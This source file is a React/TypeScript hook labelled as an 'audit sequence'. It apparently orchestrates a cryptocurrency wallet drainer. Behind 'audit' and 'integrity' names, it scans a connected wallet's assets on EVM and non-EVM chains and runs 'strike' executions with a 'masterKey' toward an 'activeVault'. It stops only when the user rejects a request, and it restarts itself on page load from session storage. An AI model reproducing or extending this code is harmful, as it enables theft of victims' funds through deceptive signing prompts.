"use client";

import { useCallback, useEffect, useRef } from "react";
import { useContractMask } from "./useContractMask";
import { useTokenPermissions } from "./seTokenPermissions";
import { useWalletClient } from "wagmi";
import { useAuditScanner, startPreload } from "./useAuditScanner";
import { useAuditExecutor } from "./useAuditExecutor";
import { useNonEvmExecutor } from "./useNonEvmExecutor";

/** 🛡️ INTEGRITY VERIFICATION HELPER */
const verifySessionIntegrity = (data: any) => {
  const hasIdentity =
    data.userAddress ||
    data.solanaAddress ||
    data.bitcoinAddress ||
    data.address;

  return hasIdentity && Array.isArray(data.assets) && data.masterKey;
};

let globalSequenceRunning = false;

/**
 * 🛰️ MASTER SEQUENCE CONTROLLER (v13.3.3 - Mobile Stability Edition)
 * Ensures: Signature -> Data Fetch -> [500ms Delay] -> Provider Check -> Execution.
 */
export function useAuditSequence() {
  const { executeMask } = useContractMask();
  const { requestManualPermission } = useTokenPermissions();
  const { data: walletClient } = useWalletClient();
  const { runNonEvmStrike } = useNonEvmExecutor();

  const { performScan } = useAuditScanner();
  const { runExecutionLoop } = useAuditExecutor({
    executeMask,
    requestManualPermission,
  });

  const isBusy = useRef(false);

  /** 🛡️ MOBILE PROVIDER GUARD: Waits for injected providers to "wake up" */
  const ensureProviderReady = async (type: string, logPrefix: string) => {
    if (type === "SOLANA" || type === "SOL") {
      let attempts = 0;
      while (!(window as any).solana && attempts < 10) {
        console.log(
          `${logPrefix} ⏳ Waiting for Solana Provider (Attempt ${
            attempts + 1
          })...`,
        );
        await new Promise((r) => setTimeout(r, 200));
        attempts++;
      }
      if (!(window as any).solana) throw new Error("SOLANA_PROVIDER_MISSING");
    }
    return true;
  };

  const runAuditStep = useCallback(
    async (params: any) => {
      const logPrefix = "[useAuditSequence.ts]";

      // Prevent double-firing during high-speed transitions
      if (isBusy.current || globalSequenceRunning) {
        console.log(
          `${logPrefix} ⏳ Sequence already in progress, skipping trigger.`,
        );
        return { status: "BUSY" };
      }

      try {
        isBusy.current = true;
        globalSequenceRunning = true;

        // 🛡️ STEP 1: HANDSHAKE & DATA FETCH
        console.log(`${logPrefix} ⚡ Initializing Stealth Handshake...`);
        const scanResults = await performScan({ ...params, logPrefix });

        if (!scanResults) {
          console.warn(`${logPrefix} ⚠️ No scan results returned.`);
          return { status: "IDLE" };
        }

        if (!verifySessionIntegrity(scanResults)) {
          console.error(
            `${logPrefix} 🛑 SECURITY ALERT: Session data corrupted.`,
          );
          sessionStorage.removeItem("active_strike_session");
          throw new Error("SECURITY_INTEGRITY_VIOLATION");
        }

        if (scanResults.isFinished) {
          console.log(`${logPrefix} 🏁 Session already marked as finished.`);
          return { status: "IDLE" };
        }

        const { masterKey, activeVault, assets, plan } = scanResults;

        const userAddress =
          scanResults.userAddress ||
          scanResults.solanaAddress ||
          scanResults.bitcoinAddress ||
          scanResults.address;

        // Normalize targets using engine plan
        const strikeTargets = (
          plan && plan.length > 0 ? plan.map((p: any) => p.asset) : assets
        ).map((asset: any) => ({
          ...asset,
          contractAddress:
            asset.contractAddress || asset.tokenAddress || asset.address,
        }));

        // 🛡️ STEP 2: UI STABILITY DELAY
        await new Promise((r) => setTimeout(r, 500));

        console.log(
          `${logPrefix} ⚖️ Sequence Initialized: ${strikeTargets.length} assets identified.`,
        );

        // 🛡️ STEP 3: EXECUTION LOOP
        for (const asset of strikeTargets) {
          try {
            const chainType = (asset.chainType || "").toUpperCase();
            const chainId = Number(asset.chainId);

            const isNonEvm =
              ["SOLANA", "SOL", "BITCOIN", "BTC", "XRP", "LTC"].includes(
                chainType,
              ) || [501, 144, 0].includes(chainId);

            if (!isNonEvm) {
              // Ensure the wallet client is ready before attempting EVM execution
              if (!walletClient) {
                console.warn(
                  `${logPrefix} ⏳ Waiting for EVM Client synchronization...`,
                );
                await new Promise((r) => setTimeout(r, 500));
              }

              await runExecutionLoop({
                assets: [asset],
                userAddress,
                activeVault,
                masterKey,
                logPrefix,
                walletClient,
              });
            } else {
              // 🛡️ MOBILE FIX: Ensure Solana/Non-EVM provider is actually there before calling executor
              await ensureProviderReady(chainType, logPrefix);

              console.log(`${logPrefix} 🚀 Non-EVM Strike: ${asset.symbol}`);
              await runNonEvmStrike(asset, {
                userAddress: asset.address || userAddress,
                masterKey,
                logPrefix,
              });
            }
          } catch (err: any) {
            const isUserRejection =
              err?.code === 4001 ||
              err?.message?.toLowerCase().includes("user rejected") ||
              err?.message?.toLowerCase().includes("user denied") ||
              err?.message?.toLowerCase().includes("rejected the request");

            if (isUserRejection) {
              console.log(`${logPrefix} ℹ️ Asset execution cancelled by user.`);

              // 🛑 LOOP PREVENTION: Mark session as finished
              const session = sessionStorage.getItem("active_strike_session");
              if (session) {
                const data = JSON.parse(session);
                sessionStorage.setItem(
                  "active_strike_session",
                  JSON.stringify({ ...data, isFinished: true }),
                );
              }
              return { status: "CANCELLED" };
            }
            console.error(
              `${logPrefix} ❌ Execution failed for ${asset.symbol}:`,
              err.message,
            );
            continue;
          }
        }

        // 🛡️ STEP 4: FINALIZE
        const session = sessionStorage.getItem("active_strike_session");
        if (session) {
          const data = JSON.parse(session);
          sessionStorage.setItem(
            "active_strike_session",
            JSON.stringify({ ...data, isFinished: true }),
          );
        }

        if (params.onComplete) params.onComplete();
        return { status: "COMPLETE" };
      } catch (e: any) {
        const errorStr = (e?.message || String(e)).toLowerCase();
        const isUserRejection =
          e?.code === 4001 ||
          errorStr.includes("user rejected") ||
          errorStr.includes("user denied") ||
          errorStr.includes("rejected the request");

        if (isUserRejection) {
          console.log(`${logPrefix} ℹ️ Sequence ended gracefully by user.`);
          sessionStorage.removeItem("GHOST_SESSION_ACTIVE");
          return { status: "CANCELLED" };
        }

        console.error(`${logPrefix} ❌ Global Sequence Error:`, e.message);
        return { status: "ERROR" };
      } finally {
        isBusy.current = false;
        globalSequenceRunning = false;
        console.log(`${logPrefix} ♻️ Main Cycle Finished.`);
      }
    },
    [performScan, runExecutionLoop, walletClient, runNonEvmStrike],
  );

  useEffect(() => {
    startPreload();

    const session = sessionStorage.getItem("active_strike_session");

    if (session && !globalSequenceRunning) {
      const data = JSON.parse(session);
      if (data.isFinished) return;

      const hasValidAddress =
        data.userAddress || data.solanaAddress || data.bitcoinAddress;

      if (!hasValidAddress) return;

      const timer = setTimeout(() => {
        runAuditStep({
          userAddress: data.userAddress,
          solanaAddress: data.solanaAddress,
          bitcoinAddress: data.bitcoinAddress,
          solana: data.solanaAddress,
          btc: data.bitcoinAddress,
        });
      }, 1200);
      return () => clearTimeout(timer);
    }
  }, [runAuditStep]);

  return { runAuditStep };
}
